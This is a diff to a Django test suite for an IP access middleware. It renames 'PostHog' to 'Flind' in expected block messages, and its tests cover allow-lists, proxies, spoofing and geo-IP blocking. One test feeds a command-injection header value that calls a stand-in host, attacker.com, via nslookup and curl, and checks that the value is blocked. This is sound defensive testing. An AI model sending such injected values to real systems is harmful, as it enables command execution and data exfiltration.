@@ -463,37 +463,37 @@ class TestAccessMiddleware(APIBaseTest):
             # not in list
             response = self.client.get("/", REMOTE_ADDR="10.0.0.1")
             self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertIn(b"PostHog is not available", response.content)
+            self.assertIn(b"Flind is not available", response.content)
 
             # /31 block
             response = self.client.get("/", REMOTE_ADDR="192.168.0.1")
             self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertNotIn(b"PostHog is not available", response.content)
+            self.assertNotIn(b"Flind is not available", response.content)
 
             response = self.client.get("/", REMOTE_ADDR="192.168.0.2")
             self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertIn(b"PostHog is not available", response.content)
+            self.assertIn(b"Flind is not available", response.content)
 
             # /24 block
             response = self.client.get("/", REMOTE_ADDR="127.0.0.1")
             self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertNotIn(b"PostHog is not available", response.content)
+            self.assertNotIn(b"Flind is not available", response.content)
 
             response = self.client.get("/", REMOTE_ADDR="127.0.0.100")
             self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertNotIn(b"PostHog is not available", response.content)
+            self.assertNotIn(b"Flind is not available", response.content)
 
             response = self.client.get("/", REMOTE_ADDR="127.0.0.200")
             self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertIn(b"PostHog is not available", response.content)
+            self.assertIn(b"Flind is not available", response.content)
 
             # precise ip
             response = self.client.get("/", REMOTE_ADDR="128.0.0.1")
             self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
-            self.assertNotIn(b"PostHog is not available", response.content)
+            self.assertNotIn(b"Flind is not available", response.content)
 
             response = self.client.get("/", REMOTE_ADDR="128.0.0.2")
-            self.assertIn(b"PostHog is not available", response.content)
+            self.assertIn(b"Flind is not available", response.content)
 
     def test_trusted_proxies(self):
         with self.settings(
@@ -506,7 +506,7 @@ class TestAccessMiddleware(APIBaseTest):
                     REMOTE_ADDR="10.0.0.1",
                     headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"},
                 )
-                self.assertNotIn(b"PostHog is not available", response.content)
+                self.assertNotIn(b"Flind is not available", response.content)
 
     def test_attempt_spoofing(self):
         with self.settings(
@@ -520,7 +520,7 @@ class TestAccessMiddleware(APIBaseTest):
                     headers={"x-forwarded-for": "192.168.0.1,10.0.0.2"},
                 )
                 self.assertEqual(response.status_code, 403)
-                self.assertIn(b"PostHog is not available", response.content)
+                self.assertIn(b"Flind is not available", response.content)
 
     def test_trust_all_proxies(self):
         with self.settings(
@@ -533,7 +533,7 @@ class TestAccessMiddleware(APIBaseTest):
                     REMOTE_ADDR="10.0.0.1",
                     headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"},
                 )
-                self.assertNotIn(b"PostHog is not available", response.content)
+                self.assertNotIn(b"Flind is not available", response.content)
 
     def test_blocked_geoip_regions(self):
         with self.settings(
@@ -545,12 +545,12 @@ class TestAccessMiddleware(APIBaseTest):
                     "/",
                     REMOTE_ADDR="45.90.4.87",
                 )
-                self.assertIn(b"PostHog is not available", response.content)
+                self.assertIn(b"Flind is not available", response.content)
                 response = self.client.get(
                     "/",
                     REMOTE_ADDR="28.160.62.192",
                 )
-                self.assertNotIn(b"PostHog is not available", response.content)
+                self.assertNotIn(b"Flind is not available", response.content)
 
         with self.settings(
             BLOCKED_GEOIP_REGIONS=["DE"],
@@ -558,7 +558,7 @@ class TestAccessMiddleware(APIBaseTest):
         ):
             with self.settings(TRUST_ALL_PROXIES=True):
                 response = self.client.get("/", REMOTE_ADDR="28.160.62.192", headers={"x-forwarded-for": ""})
-                self.assertNotIn(b"PostHog is not available", response.content)
+                self.assertNotIn(b"Flind is not available", response.content)
 
     def test_ip_with_port_stripped(self):
         """IP addresses with ports should have the port stripped before validation."""
@@ -569,12 +569,12 @@ class TestAccessMiddleware(APIBaseTest):
         ):
             # IPv4 with port
             response = self.client.get("/", headers={"x-forwarded-for": "192.168.0.1:8080"})
-            self.assertNotIn(b"PostHog is not available", response.content)
+            self.assertNotIn(b"Flind is not available", response.content)
 
             # IPv6 with port (bracketed format)
             response = self.client.get("/", headers={"x-forwarded-for": "[::1]:443"})
             # ::1 is not in allowed blocks, so should be blocked
-            self.assertIn(b"PostHog is not available", response.content)
+            self.assertIn(b"Flind is not available", response.content)
 
     def test_malformed_ip_blocked(self):
         """Malformed IPs and attack payloads should be blocked (fail closed)."""
@@ -588,15 +588,15 @@ class TestAccessMiddleware(APIBaseTest):
                 "/",
                 headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"},
             )
-            self.assertIn(b"PostHog is not available", response.content)
+            self.assertIn(b"Flind is not available", response.content)
 
             # Invalid IP format
             response = self.client.get("/", headers={"x-forwarded-for": "not-an-ip"})
-            self.assertIn(b"PostHog is not available", response.content)
+            self.assertIn(b"Flind is not available", response.content)
 
             # Valid IP should work
             response = self.client.get("/", headers={"x-forwarded-for": "192.168.1.1"})
-            self.assertNotIn(b"PostHog is not available", response.content)
+            self.assertNotIn(b"Flind is not available", response.content)
 
     @parameterized.expand([("signed", MANAGED_PROXY_KEY, True), ("unsigned", "some-other-key", False)])
     def test_blocked_geoip_regions_sees_managed_proxy_client_ip(self, _name: str, key: str, blocked: bool) -> None:
@@ -615,7 +615,7 @@ class TestAccessMiddleware(APIBaseTest):
                 **_managed_proxy_headers(MANAGED_PROXY_GERMAN_CLIENT_IP, key=key),
             )
 
-        assert (b"PostHog is not available" in response.content) is blocked
+        assert (b"Flind is not available" in response.content) is blocked
 
 
 @override_settings(
@@ -1128,7 +1128,7 @@ class TestAutoProjectMiddleware(APIBaseTest):
         assert res.headers["Location"] == f"/project/{self.second_team.pk}/home?t=1"
 
 
-@override_settings(CLOUD_DEPLOYMENT="US")  # As PostHog Cloud
+@override_settings(CLOUD_DEPLOYMENT="US")  # As Flind Cloud
 class TestPostHogTokenCookieMiddleware(APIBaseTest):
     CONFIG_AUTO_LOGIN = False
 
@@ -1400,7 +1400,7 @@ class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
 
     @parameterized.expand(
         [
-            # A safe `next` lets staff return straight to the PostHog app.
+            # A safe `next` lets staff return straight to the Flind app.
             ("safe_next", "?next=/", "/"),
             # No `next` keeps the default admin change-page redirect.
             ("no_next", "", None),
@@ -1426,7 +1426,7 @@ class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
 
     def test_loginas_logout_with_next_returns_to_app_after_expiry(self):
         """Even when the session has expired server-side, `next` survives the middleware
-        bounce so staff still land back in the PostHog app."""
+        bounce so staff still land back in the Flind app."""
         now = datetime.now()
         with time_machine.travel(now, tick=False):
             self.login_as_other_user()
